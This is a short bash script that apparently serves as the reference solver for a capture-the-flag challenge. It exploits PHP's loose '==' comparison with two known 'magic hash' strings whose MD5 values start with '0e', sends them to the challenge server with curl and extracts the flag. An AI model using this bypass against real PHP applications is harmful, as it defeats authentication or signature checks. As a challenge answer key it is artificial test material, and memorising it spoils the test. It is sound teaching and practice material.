#!/usr/bin/env bash
# Reference solver for hash-collision.
# Two different alphanumeric strings whose MD5 both render as "0e<digits>";
# PHP's loose == compares them as the number 0, so the signatures "match".
#   md5("240610708") = 0e462097431906509019562988736854
#   md5("QNKCDZO")   = 0e830400451993494058024219903391
# Usage: ./solve.sh http://HOST:8009
set -euo pipefail
BASE="${1:?usage: solve.sh http://HOST:8009}"
curl -fsS --data 'a=240610708' --data 'b=QNKCDZO' "${BASE}/" \
  | grep -oE 'SecurinetsENIT\{[^}]+\}'
